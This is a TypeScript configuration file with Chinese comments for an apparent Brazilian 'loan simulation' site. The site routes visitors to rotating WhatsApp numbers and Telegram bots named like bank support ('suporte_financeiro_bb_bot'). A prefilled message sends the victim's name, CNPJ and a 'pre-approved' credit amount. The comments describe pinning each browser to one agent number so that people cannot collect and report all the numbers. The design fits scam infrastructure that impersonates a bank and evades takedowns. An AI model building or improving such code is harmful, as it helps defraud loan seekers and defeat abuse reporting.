/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * -------------------------------------------------------------
 * 🏦 巴西贷款系统客服重定向核心配置文件 (支持多客服轮询)
 * -------------------------------------------------------------
 * 
 * 💡 说明:
 * 1. 本文件允许您在【后端或代码层面】直接配置客服联系渠道，防止普通用户或竞争对手在前端随意篡改配置。
 * 2. 两个渠道均支持【轮询（Round-Robin）分流规则】：
 *    - 您可以一次性填入多个 WhatsApp 客服号码并使用逗号或数组形式分开。
 *    - 您也可以一次性填入多个 Telegram 机器人或咨询客服链接。
 *    - 当用户模拟提交数据成功时，系统将通过轮询机制自动按顺序将流量均匀分发给这些客服代表。
 * 
 * ⚙️ 提示：修改下面的数组即可添加/删除客服，并支持动态格式占位符！
 */

export interface LoanRouteConfig {
  // ==========================================
  // 🟢 WHATSAPP 客服轮询池 (输入多个巴西手机号，带国家代码 55)
  // ==========================================
  whatsappPool: string[];

  // ==========================================
  // 🔵 TELEGRAM 客服链接轮询池 (输入多个 TG 链接或机器人链接)
  // ==========================================
  telegramPool: string[];

  // ==========================================
  // ✉️ WHATSAPP 预设文案模版 (支持 {nome}, {cpf}, {cnpj}, {nome_empresa}, {prazo}, {valor_parcela}, {valor_aprovado}, {codigo_atendimento} 变量)
  // ==========================================
  whatsappMessageTemplate: string;
}

export const DYNAMIC_SYSTEM_CONFIG: LoanRouteConfig = {
  // 🟩 1. 在此填入您的 WhatsApp 客服号码列表（支持任意多个手机号，纯数字不带特殊字符，巴西号码须带国际区号 55）
  // 访客提交后将从该列表内轮序顺序分发。例如：['5511999999999', '5511888888888', '5531777777777']
  whatsappPool: [
    '5511999999999', // 客服代表 A 数值例子
    '5511888888888', // 客服代表 B 数值例子
    '5531777777777'  // 客服代表 C 数值例子
  ],

  // 🟦 2. 在此填入您的 Telegram 机器人或咨询台客服链接列表
  // 访客提交后将从该列表内按顺序轮训分发。
  telegramPool: [
    'https://t.me/suporte_financeiro_bb_bot', // 客服机器人链接 A数例子
    'https://t.me/suporte_financeiro_bb_2_bot' // 客服机器人链接 B数例子
  ],

  // 💬 3. WhatsApp 发送的消息模板
  whatsappMessageTemplate: 'Olá! Sou {nome}, representante da empresa {nome_empresa} (CNPJ: {cnpj}). Acabei de simular nosso limite de crédito PJ no Banco Simulado de {prazo}x de {valor_parcela}. Gostaria de liberar o valor pré-aprovado de {valor_aprovado}. Protocolo: {codigo_atendimento}'
};

/**
 * 获取当前轮询选中的 WhatsApp 号码和 Telegram 链接
 * 
 * 💡 游客粘性锁定策略 (Visitor-Sticky Agent Locking):
 * - 为了防止别有用心的人不断重复提交/刷新页面以获取所有的 WhatsApp 账号并恶意举报，
 *   系统采用浏览器设备“粘性锁定”规则：
 *   1. 不同的用户/不同的浏览器访问时，会通过 Math.random() 随机分配到列表里的某一个客服代表，以此实现绝对均匀的渠道流量分摊。
 *   2. 同一个浏览器访问时，索引一旦生成，便会【永久锁定】在 localStorage 中。
 *   3. 无论用户刷新多少次页面、重复提交多少个表单，系统始终只会显示【同一个】客服号码。从而将捣乱者彻底隔离在单一通道，极大保护了客服号的安全性。
 */
export function getActiveRotatedRoutes() {
  const wsCount = DYNAMIC_SYSTEM_CONFIG.whatsappPool.length || 1;
  const tgCount = DYNAMIC_SYSTEM_CONFIG.telegramPool.length || 1;

  let currentWsIndex = 0;
  let currentTgIndex = 0;

  try {
    // 读取本地保存的已锁定轮询序号
    let savedWsIndex = localStorage.getItem('bb_locked_ws_index');
    let savedTgIndex = localStorage.getItem('bb_locked_tg_index');

    // 如果是第一次访问，随机生成并永久锁定客服
    if (savedWsIndex === null) {
      const randomWs = Math.floor(Math.random() * wsCount);
      localStorage.setItem('bb_locked_ws_index', randomWs.toString());
      savedWsIndex = randomWs.toString();
    }
    if (savedTgIndex === null) {
      const randomTg = Math.floor(Math.random() * tgCount);
      localStorage.setItem('bb_locked_tg_index', randomTg.toString());
      savedTgIndex = randomTg.toString();
    }

    currentWsIndex = parseInt(savedWsIndex, 10) % wsCount;
    currentTgIndex = parseInt(savedTgIndex, 10) % tgCount;
  } catch (e) {
    console.error('LocalStorage not available, falling back to random selection:', e);
    // 降级使用纯随机
    currentWsIndex = Math.floor(Math.random() * wsCount);
    currentTgIndex = Math.floor(Math.random() * tgCount);
  }

  const activeWhatsapp = DYNAMIC_SYSTEM_CONFIG.whatsappPool[currentWsIndex] || '5511999999999';
  const activeTelegram = DYNAMIC_SYSTEM_CONFIG.telegramPool[currentTgIndex] || 'https://t.me/suporte_financeiro_bb_bot';

  return {
    whatsappNumber: activeWhatsapp,
    telegramLink: activeTelegram,
    currentWsIndex,
    currentTgIndex
  };
}

/**
 * 粘性政策下，此函数已被安全禁用（空实现），以确保用户无论如何点击提交都不会转移/切换客服
 */
export function advanceRotationIndex() {
  // 保持空实现，锁定客服，永不跳转/递增，防止被遍历号码
  console.log('[Rotation System] Visitor-Sticky locked. No index rotation performed to protect your support team from multi-number reporting.');
}
